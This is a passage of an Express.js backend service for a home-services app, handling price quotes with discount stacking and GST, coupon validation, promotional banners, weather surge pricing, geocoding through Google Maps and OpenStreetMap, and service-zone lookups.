  let memberDiscount = member.discount || 0
  // Phase 3 — stacking policy + margin guard (admin-configurable).
  const rules = await pricingRules()
  // Stacking: 'exclusive' means membership does NOT stack on top of an offer/coupon discount.
  if (rules.stacking === 'exclusive' && q.discount > 0) memberDiscount = 0
  // Margin guard: cap the COMBINED discount (offers + membership) so an order can't be over-discounted.
  // Trim the membership benefit first, then the offer discount if still over the cap.
  const caps = []
  if (rules.max_discount_pct > 0) caps.push(Math.round(q.subtotal * rules.max_discount_pct / 100))
  if (rules.min_service_amount > 0) caps.push(Math.max(0, q.subtotal - rules.min_service_amount))
  if (caps.length) {
    const cap = Math.min(...caps)
    let over = (q.discount + memberDiscount) - cap
    if (over > 0) {
      const cutMember = Math.min(memberDiscount, over); memberDiscount -= cutMember; over -= cutMember
      if (over > 0) q.discount = Math.max(0, q.discount - over)
    }
  }
  // Convenience fee stays zone-level; GST rate is per-service; inclusive/exclusive display is platform-wide.
  const ex = (cfg && cfg.pricingExtras) || {}
  const fee = Math.round(Number(ex.convenienceFee) || 0)
  const gstIncluded = (await getSetting(ADMIN_URL, 'gst_inclusive', 'true')) === 'true'
  // Per-item GST at each service's own rate; coupon discount + peak surcharge allocated by price share (GST on the net value).
  const gmap = {}
  const ids = q.items.map((it) => it.id)
  if (ids.length) { const { rows } = await pool.query('SELECT id, COALESCE(gst_pct,18) AS g FROM services WHERE id = ANY($1)', [ids]); for (const r of rows) gmap[r.id] = Number(r.g) }
  const gross = q.subtotal || 0
  let taxF = 0
  for (const it of q.items) {
    const share = gross > 0 ? (it.price / gross) : (1 / (q.items.length || 1))
    const net = Math.max(0, it.price - (q.discount + memberDiscount) * share + peakSurcharge * share + surgeSurcharge * share)
    const g = gmap[it.id] ?? 18
    taxF += gstIncluded ? (net - net / (1 + g / 100)) : (net * g / 100)
  }
  const tax = Math.round(taxF)
  const serviceAmount = Math.max(0, q.subtotal - q.discount - memberDiscount + peakSurcharge + surgeSurcharge)
  const total = gstIncluded ? (serviceAmount + fee) : (serviceAmount + tax + fee)
  const gstBase = gstIncluded ? (serviceAmount - tax) : serviceAmount
  const gstPct = gstBase > 0 ? Math.round((tax / gstBase) * 100) : 0   // blended rate for display
  return {
    status: 200,
    body: {
      items: q.items, coupon: q.coupon, subtotal: q.subtotal, discount: q.discount, peakPct, peakSurcharge, isPeak: onPeak,
      surgePct, surgeAmount: surgeSurcharge, surgeReason: surgeSurcharge ? surge.reason : '',
      memberDiscount, memberPlan: memberDiscount > 0 ? (member.planName || '') : '', memberRemaining: member.remaining ?? null,
      fee, tax, gstPct, gstIncluded, total, savings: q.savings, appliedCampaignIds: q.appliedCampaignIds,
    },
  }
}

// Validate a single manual coupon against the DB (window, usage cap, min subtotal) → discount.
async function validateCouponDb(code, subtotal) {
  if (!code.trim()) return { error: 'Enter a coupon code' }
  const { rows } = await pool.query(
    `SELECT c.coupon_code, c.expiry, c.usage_limit, c.used_count, m.*
       FROM coupon c JOIN campaign_master m ON m.campaign_id = c.campaign_id
      WHERE UPPER(c.coupon_code) = UPPER($1)`, [code.trim()])
  const row = rows[0]
  if (!row || row.status !== 'active' || !withinWindow(row)) return { error: 'Invalid coupon code' }
  if (row.expiry && new Date().toISOString().slice(0, 10) > String(row.expiry).slice(0, 10)) return { error: 'This coupon has expired' }
  if (row.usage_limit > 0 && row.used_count >= row.usage_limit) return { error: 'This coupon is no longer available' }
  if (subtotal < (row.min_subtotal || 0)) return { error: `Add ₹${(row.min_subtotal || 0) - subtotal} more to use ${row.coupon_code.toUpperCase()}` }
  const discount = rawDiscount(row, subtotal)
  if (discount <= 0) return { error: 'Invalid coupon code' }
  return { code: row.coupon_code.toUpperCase(), discount, label: row.banner_subtitle || row.banner_title || row.coupon_code }
}

const app = express()
app.use(express.json())
// Serve the service images (bundled from services/catalog/public/services). Reached via the
// gateway because the path starts with /api/services, which routes here.
app.use('/api/services-media', express.static(path.join(__dirname, 'public/services'), { maxAge: '7d' }))
app.get('/health', (_q, res) => res.json({ service: 'catalog', ok: true }))

/* ---------- customer catalogue (public) ---------- */
// `?pincode=` resolves the zone; the Bearer token (optional) resolves the customer so prices
// reflect that zone's overrides + eligible campaigns (zone + customer offers).
app.get('/api/services', async (req, res) => {
  const zoneId = await zoneIdForPincode(req.query.pincode)
  res.json({ categories: CATEGORIES, services: await catalogueFor(zoneId, customerIdFromReq(req)) })
})
app.get('/api/services/:id', async (req, res) => {
  const zoneId = await zoneIdForPincode(req.query.pincode)
  const s = await serviceDetail(req.params.id, zoneId, customerIdFromReq(req))
  if (!s) return res.status(404).json({ error: 'Service not found' })
  res.json(s)
})

/* ---------- pricing / coupons / home ---------- */
app.post('/api/quote', async (req, res) => {
  const r = await quote({ ...(req.body || {}), customerId: customerIdFromReq(req) })
  res.status(r.status).json(r.body)
})
// Public coupon list (manual-entry codes) for the checkout "available offers" panel — from the DB,
// falling back to the legacy static list only if the coupon table is empty.
app.get('/api/coupons', async (_q, res) => {
  const { rows } = await pool.query(
    `SELECT c.coupon_code, c.expiry, m.discount_type, m.discount_value, m.max_discount, m.min_subtotal, m.banner_subtitle, m.banner_title
       FROM coupon c JOIN campaign_master m ON m.campaign_id = c.campaign_id
      WHERE m.status='active' AND c.auto_apply = false ORDER BY m.min_subtotal`)
  if (!rows.length) return res.json(COUPONS)
  res.json(rows.map((r) => ({
    code: r.coupon_code, type: r.discount_type === 'percent' ? 'pct' : 'flat', value: r.discount_value,
    max: r.max_discount || undefined, min: r.min_subtotal, label: r.banner_subtitle || r.banner_title || r.coupon_code,
  })))
})
app.post('/api/coupons/validate', async (req, res) => {
  const r = await validateCouponDb(String(req.body?.code || ''), Number(req.body?.subtotal) || 0)
  if (r.error) return res.status(400).json(r)
  res.json(r)
})
// Admin customer-profile Offers tab: active manual coupons + THIS customer's per-coupon usage/status.
app.get('/api/internal/customers/:id/offers', internalOnly, async (req, res) => {
  const cid = Number(req.params.id)
  const camps = await pool.query(
    `SELECT m.campaign_id, m.campaign_name, m.discount_type, m.discount_value, m.max_discount, m.min_subtotal,
            m.banner_title, m.banner_subtitle, m.ends, c.coupon_code, c.expiry,
            r.max_usage AS per_customer_limit, r.segment
       FROM campaign_master m
       JOIN coupon c ON c.campaign_id = m.campaign_id
       LEFT JOIN campaign_customer_rule r ON r.campaign_id = m.campaign_id
      WHERE m.status='active' AND c.auto_apply=false
      ORDER BY m.min_subtotal, m.campaign_id`)
  const usage = await pool.query('SELECT campaign_id, COUNT(*)::int n FROM customer_campaign_usage WHERE customer_id=$1 GROUP BY campaign_id', [cid])
  const uBy = Object.fromEntries(usage.rows.map((u) => [u.campaign_id, u.n]))
  const now = Date.now()
  const coupons = camps.rows.map((r) => {
    const used = uBy[r.campaign_id] || 0
    const limit = r.per_customer_limit || 0                 // 0 = unlimited
    const validTill = r.expiry || r.ends || null
    const expired = validTill ? new Date(validTill).getTime() < now : false
    const exhausted = limit > 0 && used >= limit
    return {
      campaignId: r.campaign_id, code: r.coupon_code, name: r.campaign_name, subtitle: r.banner_subtitle,
      bannerTitle: r.banner_title, discountType: r.discount_type, discountValue: r.discount_value,
      maxDiscount: r.max_discount, minSubtotal: r.min_subtotal, validTill,
      perCustomerLimit: limit, usedByCustomer: used, segment: r.segment || 'all',
      status: expired ? 'Expired' : exhausted ? 'Used' : 'Available',
    }
  })
  res.json({ totalOffers: new Set(camps.rows.map((r) => r.campaign_id)).size, coupons })
})
app.get('/api/home', (_q, res) => res.json({ referral: REFERRAL, trust: TRUST_BADGES, instantEta: 5 }))
// Live surge for the customer's zone (public, pincode-keyed) — powers the "rain incoming" heads-up
// on Home so a customer sees it on open, before starting a booking. Silent (no surge) when the
// pincode isn't in a live zone or there's no active surge.
app.get('/api/surge', async (req, res) => {
  const zoneId = await zoneIdForPincode(req.query.pincode)
  if (!zoneId) return res.json({ active: false, pct: 0, reason: '' })
  const s = getSurgeForZone(zoneId)
  res.json({ active: !!s.active, pct: s.pct || 0, reason: s.active ? s.reason : '', prob: s.prob ?? null })
})
// Dynamic Home hero slides (public) — merges scheduled festival/promo banners (in their date window),
// live offers (campaigns with a banner), and the weather surge, ranked by priority. The app prepends
// its own greeting slide and rotates through them. Everything here is real, dated, targeted data.
app.get('/api/home-banners', async (req, res) => {
  const zoneId = await zoneIdForPincode(req.query.pincode)
  const customerId = customerIdFromReq(req)
  const slides = []

  // 1) scheduled banners currently in their active window, for this zone (or all zones)
  const scheduled = await pool.query(
    `SELECT * FROM home_banners
      WHERE status='active'
        AND (starts IS NULL OR starts <= CURRENT_DATE)
        AND (ends   IS NULL OR ends   >= CURRENT_DATE)
        AND (zone_id IS NULL OR zone_id = $1)
      ORDER BY priority DESC, id DESC`, [zoneId])
  for (const b of scheduled.rows) slides.push({
    key: `banner-${b.id}`, kind: b.kind || 'festival', title: b.title, subtitle: b.subtitle || '',
    emoji: b.emoji || '', theme: b.theme || 'purple', ctaLabel: b.cta_label || '', ctaLink: b.cta_link || '',
    image: b.image_url || '', priority: b.priority ?? 50,
  })

  // 2) live offers — campaigns with a banner that are in-window and eligible for this customer
  try {
    const zmap = await zonePriceMap(zoneId)
    const [campaigns, ctx] = await Promise.all([campaignsForZone(zoneId, zmap, customerId), buildCtx(customerId)])
    const now = new Date()
    for (const c of campaigns) {
      if (!c.banner_title || !withinWindow(c, now)) continue
      if (c.campaign_type === 'customer' && !customerEligible(c, ctx)) continue
      const badge = c.discount_type === 'percent' ? `${c.discount_value}% OFF` : `₹${c.discount_value} OFF`
      slides.push({
        key: `offer-${c.campaign_id}`, kind: 'offer', title: c.banner_title, subtitle: c.banner_subtitle || badge,
        emoji: '🎁', theme: 'sunset', ctaLabel: c.coupon ? `Use ${c.coupon.coupon_code}` : 'View offers',
        ctaLink: '/offers', priority: 60,
      })
    }
  } catch { /* offers are best-effort — never block the hero */ }

  // 3) live weather surge slide (rendered with the rain animation by the app)
  if (zoneId) {
    const s = getSurgeForZone(zoneId)
    if (s.active && s.pct > 0) slides.push({
      key: 'weather', kind: 'weather', reason: s.reason, pct: s.pct, prob: s.prob ?? null,
      title: s.reason === 'rain' ? 'Rain incoming' : 'High demand right now',
      subtitle: s.reason === 'rain'
        ? `${s.prob != null ? s.prob + '% chance — ' : ''}prices up ${s.pct}%. Book soon.`
        : `Prices up ${s.pct}%. Book soon.`,
      emoji: s.reason === 'rain' ? '🌧️' : '⚡', theme: 'rain', ctaLabel: '', ctaLink: '', priority: 70,
    })
  }

  slides.sort((a, b) => (b.priority || 0) - (a.priority || 0))
  res.json(slides)
})
// Public proxy for banner background images — streams the object from the media bucket so the phone
// (which can't reach the localhost-bound MinIO port) loads it through the gateway instead.
app.get('/api/banner-media/:key(*)', async (req, res) => {
  try {
    const { body, contentType } = await getObjectStream(req.params.key)
    res.set('Content-Type', contentType)
    res.set('Cache-Control', 'public, max-age=604800')
    body.pipe(res)
  } catch { res.status(404).end() }
})
// Seller details for the customer tax invoice (from admin settings). Public — GSTIN is on every invoice anyway.
app.get('/api/invoice-info', async (_q, res) => res.json({
  name: await getSetting(ADMIN_URL, 'company_name', 'HomeHelp Services Pvt. Ltd.'),
  gstin: await getSetting(ADMIN_URL, 'company_gstin', ''),
  address: await getSetting(ADMIN_URL, 'company_address', ''),
  state: await getSetting(ADMIN_URL, 'company_state', ''),
  sac: await getSetting(ADMIN_URL, 'service_sac', '9987'),
  prefix: await getSetting(ADMIN_URL, 'invoice_prefix', 'INV'),
  gstInclusive: (await getSetting(ADMIN_URL, 'gst_inclusive', 'false')) === 'true',
}))
app.get('/api/referral', (_q, res) => res.json(REFERRAL))

// Customer Offers carousel: campaigns with a banner, scoped to the caller's zone + eligibility.
app.get('/api/offers', async (req, res) => {
  const zoneId = await zoneIdForPincode(req.query.pincode)
  const customerId = customerIdFromReq(req)
  const zmap = await zonePriceMap(zoneId)
  const [campaigns, ctx] = await Promise.all([campaignsForZone(zoneId, zmap, customerId), buildCtx(customerId)])
  const now = new Date()
  const offers = campaigns
    .filter((c) => c.banner_title && withinWindow(c, now) && (c.campaign_type !== 'customer' || customerEligible(c, ctx)))
    .map((c) => ({
      id: c.campaign_id, type: c.campaign_type, title: c.banner_title, subtitle: c.banner_subtitle,
      badge: c.discount_type === 'percent' ? `${c.discount_value}% OFF` : `₹${c.discount_value} OFF`,
      code: c.coupon ? c.coupon.coupon_code : null, serviceId: c.service_id || null, category: c.category || null,
    }))
  res.json(offers)
})

/* ---------- address search (Google Places when key set; OpenStreetMap/Nominatim fallback) ----------
   Google is proxied server-side so the key stays private and CORS isn't an issue. The key comes
   from admin settings (google_maps_key). Without it, we fall back to Nominatim (limited India POIs). */
const NOMINATIM = 'https://nominatim.openstreetmap.org'
const gkey = async () => { try { return await getSetting(ADMIN_URL, 'google_maps_key', '') } catch { return '' } }
// Google Maps APIs fail hard until billing is enabled (REQUEST_DENIED). Once we see that, stop
// hitting Google for a while so every address search doesn't waste a failing round-trip before
// the OSM fallback — the key auto-recovers after the cooldown once billing is turned on.
let googleDeniedUntil = 0
const googleUsable = async () => (Date.now() < googleDeniedUntil ? '' : await gkey())
const markGoogleDenied = (status, msg) => {
  if (status === 'REQUEST_DENIED' || status === 'OVER_QUERY_LIMIT' || /billing/i.test(msg || '')) {
    googleDeniedUntil = Date.now() + 10 * 60 * 1000
    console.warn('[catalog] Google disabled for 10 min:', status, (msg || '').slice(0, 80))
  }
}

async function nominatimSearch(q) {
  const r = await fetch(`${NOMINATIM}/search?format=jsonv2&q=${encodeURIComponent(q)}&limit=6&addressdetails=1&countrycodes=in`,
    { headers: { 'User-Agent': 'HomeHelp/1.0 (address search)', Accept: 'application/json' } })
  const list = await r.json()
  return (Array.isArray(list) ? list : []).map((x) => ({
    placeId: '', label: (x.display_name || '').split(',').slice(0, 2).join(',').trim(),
    sub: x.display_name || '', lat: +x.lat, lng: +x.lon, pincode: x.address?.postcode || null,
  }))
}

// Photon (OSM-based) has far better fuzzy matching on POI/apartment/residency names than raw
// Nominatim, and biases results to the caller's coordinates when provided — so a local
// "Rainbow Vistas" surfaces above a same-named building in another city.
async function photonSearch(q, lat, lng) {
  const bias = (lat != null && lng != null && !Number.isNaN(lat) && !Number.isNaN(lng)) ? `&lat=${lat}&lon=${lng}` : ''
  const r = await fetch(`https://photon.komoot.io/api/?q=${encodeURIComponent(q)}&limit=8&lang=en${bias}`,
    { headers: { 'User-Agent': 'HomeHelp/1.0 (address search)', Accept: 'application/json' } })
  const j = await r.json()
  return (j.features || []).map((f) => {
    const p = f.properties || {}, c = f.geometry?.coordinates || []
    const label = p.name || [p.street, p.district].filter(Boolean).join(', ')
    const sub = [p.name && p.street, p.district, p.city, p.state, p.postcode, p.country].filter(Boolean).join(', ')
    return { placeId: '', label, sub, lat: c[1], lng: c[0], pincode: p.postcode || null, cc: p.countrycode || '' }
  }).filter((x) => x.label && x.lat != null && (!x.cc || x.cc === 'IN'))
    .map(({ cc, ...x }) => x)
}

// Merge Photon (name-first) + Nominatim, de-duplicated by name + rounded coordinates.
async function osmSearch(q, lat, lng) {
  const [ph, no] = await Promise.all([
    photonSearch(q, lat, lng).catch(() => []),
    nominatimSearch(q).catch(() => []),
  ])
  const seen = new Set(), out = []
  for (const r of [...ph, ...no]) {
    const key = `${(r.label || '').toLowerCase()}|${(+r.lat).toFixed(2)}|${(+r.lng).toFixed(2)}`
    if (seen.has(key)) continue
    seen.add(key); out.push(r)
    if (out.length >= 8) break
  }
  return out
}
const pinFromComponents = (comps) => (comps || []).find((c) => (c.types || []).includes('postal_code'))?.long_name || null

// Predictive address search. Google Autocomplete (India-biased) → results with a place_id you
// resolve to coords via /api/places/details. Falls back to Nominatim on no-key or API error.
app.get('/api/places/search', async (req, res) => {
  const q = String(req.query.q || '').trim()
  if (!q) return res.json({ results: [] })
  const lat = req.query.lat != null ? Number(req.query.lat) : null
  const lng = req.query.lng != null ? Number(req.query.lng) : null
  const key = await googleUsable()
  try {
    if (key) {
      // Bias Google Autocomplete to the caller's location when we have it (surfaces nearby apartments first).
      const bias = (lat != null && lng != null && !Number.isNaN(lat) && !Number.isNaN(lng)) ? `&location=${lat},${lng}&radius=40000` : ''
      const url = `https://maps.googleapis.com/maps/api/place/autocomplete/json?input=${encodeURIComponent(q)}&key=${key}&components=country:in&language=en${bias}`
      const j = await (await fetch(url)).json()
      if (j.status === 'OK' || j.status === 'ZERO_RESULTS') {
        return res.json({ provider: 'google', results: (j.predictions || []).map((p) => ({
          placeId: p.place_id,
          label: p.structured_formatting?.main_text || p.description,
          sub: p.structured_formatting?.secondary_text || p.description,
        })) })
      }
      console.warn('[catalog] google autocomplete:', j.status, j.error_message || '')
      markGoogleDenied(j.status, j.error_message)
    }
    return res.json({ provider: 'osm', results: await osmSearch(q, lat, lng) })
  } catch (e) {
    console.error('[catalog] places/search:', e.message)
    try { return res.json({ provider: 'osm', results: await osmSearch(q, lat, lng) }) }
    catch { return res.status(502).json({ error: 'Place search failed', results: [] }) }
  }
})

// Resolve a Google place_id to coordinates + a clean formatted address.
app.get('/api/places/details', async (req, res) => {
  const placeId = String(req.query.placeId || req.query.id || '')
  if (!placeId) return res.status(400).json({ error: 'Missing placeId' })
  const key = await googleUsable()
  if (!key) return res.status(400).json({ error: 'Google Maps not configured' })
  try {
    const url = `https://maps.googleapis.com/maps/api/place/details/json?place_id=${encodeURIComponent(placeId)}&key=${key}&fields=geometry,formatted_address,name,address_component&language=en`
    const j = await (await fetch(url)).json()
    if (j.status !== 'OK') { markGoogleDenied(j.status, j.error_message); return res.status(502).json({ error: j.status }) }
    const g = j.result || {}
    res.json({ label: g.name || (g.formatted_address || '').split(',')[0], sub: g.formatted_address || '',
      lat: g.geometry?.location?.lat ?? null, lng: g.geometry?.location?.lng ?? null, pincode: pinFromComponents(g.address_components) })
  } catch (e) { res.status(502).json({ error: 'Details failed' }) }
})

// Forward geocoding: a typed/manual address -> lat/lng + pincode. Google Geocoding (India-biased)
// when the key is set and billed, else OpenStreetMap/Nominatim. Used for manual address entry.
app.get('/api/geocode', async (req, res) => {
  const q = String(req.query.q || req.query.address || '').trim()
  if (!q) return res.status(400).json({ error: 'Missing address' })
  const key = await googleUsable()
  try {
    if (key) {
      const url = `https://maps.googleapis.com/maps/api/geocode/json?address=${encodeURIComponent(q)}&key=${key}&region=in&language=en`
      const j = await (await fetch(url)).json()
      if (j.status === 'OK' && j.results?.[0]) {
        const r0 = j.results[0]
        return res.json({ provider: 'google', label: (r0.formatted_address || '').split(',')[0], sub: r0.formatted_address || '',
          lat: r0.geometry?.location?.lat ?? null, lng: r0.geometry?.location?.lng ?? null, pincode: pinFromComponents(r0.address_components) })
      }
      console.warn('[catalog] google geocode:', j.status, j.error_message || '')
      markGoogleDenied(j.status, j.error_message)
    }
    const r = await fetch(`${NOMINATIM}/search?format=jsonv2&q=${encodeURIComponent(q)}&limit=1&addressdetails=1&countrycodes=in`,
      { headers: { 'User-Agent': 'HomeHelp/1.0 (geocode)', Accept: 'application/json' } })
    const x = (await r.json())?.[0]
    if (!x) return res.json({ provider: 'nominatim', lat: null, lng: null, pincode: null, label: '', sub: '' })
    res.json({ provider: 'nominatim', label: (x.display_name || '').split(',').slice(0, 2).join(',').trim(),
      sub: x.display_name || '', lat: +x.lat, lng: +x.lon, pincode: x.address?.postcode || null })
  } catch (e) { console.error('[catalog] geocode:', e.message); res.status(502).json({ error: 'Geocode failed' }) }
})

// Reverse geocoding: lat/lng -> area, city, pincode. Google (building-accurate, India-biased) when
// the key is set, else OpenStreetMap/Nominatim. Central path for the app's "use current location"
// and the auth service's GPS profile-location resolver, so pincodes are accurate everywhere.
app.get('/api/reverse-geocode', async (req, res) => {
  const lat = Number(req.query.lat), lng = Number(req.query.lng)
  if (!Number.isFinite(lat) || !Number.isFinite(lng)) return res.status(400).json({ error: 'lat & lng required' })
  const key = await googleUsable()
  try {
    if (key) {
      const url = `https://maps.googleapis.com/maps/api/geocode/json?latlng=${lat},${lng}&key=${key}&region=in&language=en`
      const j = await (await fetch(url)).json()
      if (j.status === 'OK' && j.results?.length) {
        // Google returns results most-specific (street) → least (country). Scan ACROSS all of them for
        // each field so the city comes from the proper "locality" result (e.g. Hyderabad), not a
        // mandal/district that happens to sit on the most-specific result.
        const across = (type) => { for (const r of j.results) { const c = (r.address_components || []).find((x) => x.types.includes(type)); if (c) return c.long_name } return '' }
        const area = across('sublocality_level_1') || across('sublocality') || across('neighborhood')
        // City: Google's `locality` is sometimes a mandal/neighbourhood (e.g. "Madha"). The formatted
        // address renders the real city as the segment just before "<State> <PIN>" — use that first.
        const fparts = (j.results[0].formatted_address || '').split(',').map((s) => s.trim()).filter(Boolean)
        const pinSeg = fparts.findIndex((p) => /\b\d{6}\b/.test(p))
        const cityFromFmt = pinSeg > 0 ? fparts[pinSeg - 1] : ''
        const city = cityFromFmt || across('locality') || across('postal_town') || across('administrative_area_level_2') || across('administrative_area_level_1')
        const pincode = pinFromComponents(j.results[0].address_components) || across('postal_code')
        // area + city, de-duped (avoid "Borabanda, Borabanda" when they resolve to the same name)
        let label = [area, city].filter((v, i, arr) => v && arr.indexOf(v) === i).join(', ') || (j.results[0].formatted_address || '').split(',').slice(0, 2).join(', ').trim()
        if (label && pincode) label = `${label} - ${pincode}`
        // Nearest named place → the building/apartment name to pre-fill (what GPS reverse-geocode
        // can't give). Only accept an actual building/complex — a residential place TYPE, or a name
        // that reads like a residence — so we never pre-fill the field with a random nearby shop.
        let name = ''
        try {
          const nb = await (await fetch(`https://maps.googleapis.com/maps/api/place/nearbysearch/json?location=${lat},${lng}&rankby=distance&key=${key}`)).json()
          if (nb.status === 'OK' && nb.results?.length) {
            const RESID = /residenc|apartment|towers?|heights|enclave|\bvilla|\bhomes?\b|residences|manor|society|flats?|\bblock|\bphase|nagar|colony|estate|court|\bhills?\b|\bpark\b|\bplaza\b/i
            const isBldg = (r) => (r.types || []).some((t) => ['premise', 'subpremise', 'lodging', 'apartment_complex', 'real_estate_agency'].includes(t))
            const chosen = nb.results.find((r) => isBldg(r) && RESID.test(String(r.name || ''))) || nb.results.find(isBldg) || nb.results.find((r) => RESID.test(String(r.name || '')))
            if (chosen && !/^\d+[\w/\s-]*$/.test(String(chosen.name || '').trim())) name = chosen.name || ''
          }
        } catch { /* name is optional */ }
        return res.json({ provider: 'google', label, name, area, city, pincode, sub: j.results[0].formatted_address || '' })
      }
      console.warn('[catalog] google reverse:', j.status, j.error_message || '')
      markGoogleDenied(j.status, j.error_message)
    }
    const r = await fetch(`${NOMINATIM}/reverse?format=jsonv2&lat=${lat}&lon=${lng}&zoom=16&addressdetails=1`,
      { headers: { 'User-Agent': 'HomeHelp/1.0 (reverse)', Accept: 'application/json' } })
    const j = await r.json()
    const a = j.address || {}
    const area = (a.suburb || a.neighbourhood || a.village || a.town || a.city_district || a.locality || '')
    const city = a.city || a.town || a.state_district || a.state || ''
    const pincode = a.postcode || null
    let label = [area, city].filter(Boolean).join(', ') || (j.display_name ? j.display_name.split(',').slice(0, 2).join(', ').trim() : '')
    if (label && pincode) label = `${label} - ${pincode}`
    res.json({ provider: 'nominatim', label, area, city, pincode, sub: j.display_name || '' })
  } catch (e) { console.error('[catalog] reverse:', e.message); res.status(502).json({ error: 'Reverse geocode failed' }) }
})

// Public: the Maps JS key the customer app loads to render the interactive map picker. Prefers a
// dedicated client key (maps_client_key) if set — Maps-JS keys are inherently client-exposed, so
// restrict that one by app/referrer in Google Cloud. Falls back to the server geocoding key.
app.get('/api/maps-key', async (_q, res) => {
  const [clientKey, serverKey] = await Promise.all([
    getSetting(ADMIN_URL, 'maps_client_key', '').catch(() => ''),
    gkey(),
  ])
  res.json({ key: clientKey || serverKey || '' })
})

// Normalize a pincode blob (comma/space separated) to a clean, de-duped list of 6-digit PINs.
const normPins = (v) => [...new Set(String(v || '').split(/[\s,]+/).map((s) => s.trim()).filter((s) => /^\d{6}$/.test(s)))]

// Resolve which zone covers a pincode, and load that zone's price/discount overlay from zone_pricing
// (the authority for zone pricing — kept in sync from the onboarding wizard's config on save).
async function zoneIdForPincode(pincode) {
  const pin = String(pincode || '').trim()
  if (!/^\d{6}$/.test(pin)) return null
  const { rows } = await pool.query('SELECT id, pincodes FROM zones')
  const z = rows.find((r) => normPins(r.pincodes).includes(pin))
  return z ? z.id : null
}
async function zonePriceMap(zoneId) {
  if (!zoneId) return {}
  const { rows } = await pool.query('SELECT service_id, price, discount, active FROM zone_pricing WHERE zone_id=$1', [zoneId])
  const m = {}
  for (const r of rows) if (r.active !== false) m[r.service_id] = { price: Number(r.price) || 0, discount: Number(r.discount) || 0 }
  return m
}
// The zone's config JSON (peakHours + pricingExtras drive charges). Null when no zone.
async function zoneConfigJson(zoneId) {
  if (!zoneId) return null
  const { rows } = await pool.query('SELECT config FROM zones WHERE id=$1', [zoneId])
  let c = rows[0] && rows[0].config; if (typeof c === 'string') { try { c = JSON.parse(c) } catch { c = null } }
  return c || null
}
// The zone's working-hours config for a pincode (null when no zone / not configured → all-day).
async function zoneWorkingHours(pincode) {
  const cfg = await zoneConfigJson(await zoneIdForPincode(pincode))
  return cfg && cfg.workingHours ? cfg.workingHours : null
}
const _minOfDay = (t) => { const m = /(\d{1,2}):(\d{2})/.exec(String(t || '')); return m ? (+m[1]) * 60 + (+m[2]) : null }
function isPeakAt(peak, at) {
  const mm = _minOfDay(at); if (mm == null || !peak) return false
  return peak.windows.some((w) => { const s = _minOfDay(w.start), e = _minOfDay(w.end); return s != null && e != null && mm >= s && mm < e })
}
// Mirror the wizard's config (pricing + discounts for the selected services) into zone_pricing,
// so the customer-facing price resolution has a single authoritative table to read.
async function syncZonePricing(zoneId, config) {
  const services = Array.isArray(config?.services) ? config.services : []
  const pricing = config?.pricing || {}, discounts = config?.discounts || {}
  // Ignore ids that no longer exist in the catalogue: a zone whose rows all reference dead services
  // would read as "configured with nothing" and take every service offline.
  const known = new Set((await pool.query('SELECT id FROM services')).rows.map((r) => r.id))
  await pool.query('DELETE FROM zone_pricing WHERE zone_id=$1', [zoneId])
  for (const sid of services) {
    if (!known.has(sid)) continue
    const price = Math.round(Number(pricing[sid]) || 0)
    const discount = Math.round(Number(discounts[sid]) || 0)
    // Every selected service gets a row, even with no overrides: the row is what makes the service
    // OFFERED in this zone (see catalogueFor). price 0 = follow the live catalogue price.
    await pool.query('INSERT INTO zone_pricing (zone_id, service_id, price, discount, active) VALUES ($1,$2,$3,$4,true)',
      [zoneId, sid, price, discount])
  }
}

// Service-area gating.
//  • If ANY zones exist → zones are the source of truth: a pincode is serviceable iff it (or its
//    city) belongs to a LIVE zone. This is how areas launch/pause "block by block".
//  • If NO zones exist → fall back to legacy flat settings (serviceable_pincodes/service_cities;
//    both empty = serve everywhere).
app.get('/api/serviceable', async (req, res) => {
  const pincode = String(req.query.pincode || '').trim()
  const city = String(req.query.city || '').trim().toLowerCase()
  const zones = (await pool.query('SELECT city, pincodes, status FROM zones')).rows
  if (zones.length > 0) {
    const live = zones.filter((z) => z.status === 'live')
    if (live.length === 0) return res.json({ serviceable: false, reason: 'no_live_zones', pincode: pincode || null })
    const covered = live.some((z) => {
      const pins = normPins(z.pincodes)
      const cityMatch = city && String(z.city || '').trim().toLowerCase() === city
      if (pincode) return pins.includes(pincode) || (pins.length === 0 && cityMatch)
      return cityMatch
    })
    return res.json({ serviceable: covered, reason: covered ? 'covered' : 'not_covered', pincode: pincode || null })
  }
  const pins = (await getSetting(ADMIN_URL, 'serviceable_pincodes', '')).split(',').map((s) => s.trim()).filter(Boolean)
  const cities = (await getSetting(ADMIN_URL, 'service_cities', '')).split(',').map((s) => s.trim().toLowerCase()).filter(Boolean)
  if (pins.length === 0 && cities.length === 0) return res.json({ serviceable: true, reason: 'open' })
  const serviceable = (pins.length > 0 && pins.includes(pincode)) || (cities.length > 0 && cities.includes(city))
  res.json({ serviceable, reason: serviceable ? 'covered' : 'not_covered', pincode: pincode || null })
})

// Public: live zones (for a "we're now in these areas" display).
app.get('/api/zones', async (_q, res) => {
  const { rows } = await pool.query("SELECT name, state, city FROM zones WHERE status='live' ORDER BY state, city, name")
  res.json(rows)
})

// Public: working-hours config for the zone serving a pincode. The customer app builds its bookable
// time-slot grid from this; the booking service validates chosen times against it. When there's no
// zone or it isn't configured, we return is247 (all-day) so the default slot grid is used.
app.get('/api/zone-hours', async (req, res) => {
  const wh = await zoneWorkingHours(String(req.query.pincode || '').trim())
  // No zone / no hours configured → days:null signals "use the default slot grid" (NOT 24×7).
  if (!wh) return res.json({ is247: false, days: null, specialHours: [] })
  res.json({ is247: !!wh.is247, days: wh.days || null, specialHours: wh.specialHours || [] })
})

// Internal: which zone covers a pincode — booking stamps booking.zone_id from this on create.
app.get('/api/internal/zone-for', internalOnly, async (req, res) => {
  const pincode = String(req.query.pincode || '').trim()
  if (!pincode) return res.json({ zoneId: null })
  const { rows } = await pool.query('SELECT id, name, status, pincodes FROM zones')
  const z = rows.find((r) => normPins(r.pincodes).includes(pincode))
  res.json(z ? { zoneId: z.id, zoneName: z.name, live: z.status === 'live' } : { zoneId: null })
})
// Internal: a zone's capacity/SLA config (by zoneId or pincode) — booking & dispatch read this to
// enforce Max Orders/Day, Max Travel Distance, etc. Returns { zoneId, capacity } (capacity null if unset).
app.get('/api/internal/zone-capacity', internalOnly, async (req, res) => {
  let zoneId = req.query.zoneId ? Number(req.query.zoneId) : null
  if (!zoneId && req.query.pincode) zoneId = await zoneIdForPincode(String(req.query.pincode))
  const cfg = await zoneConfigJson(zoneId)
  res.json({ zoneId: zoneId || null, capacity: (cfg && cfg.capacity) || null })
})
// Internal: full zone list (for the admin live-ops aggregation).
app.get('/api/internal/zones', internalOnly, async (_q, res) => {
  const { rows } = await pool.query('SELECT * FROM zones ORDER BY state, city, name')
  res.json(rows.map(zoneOut))
})

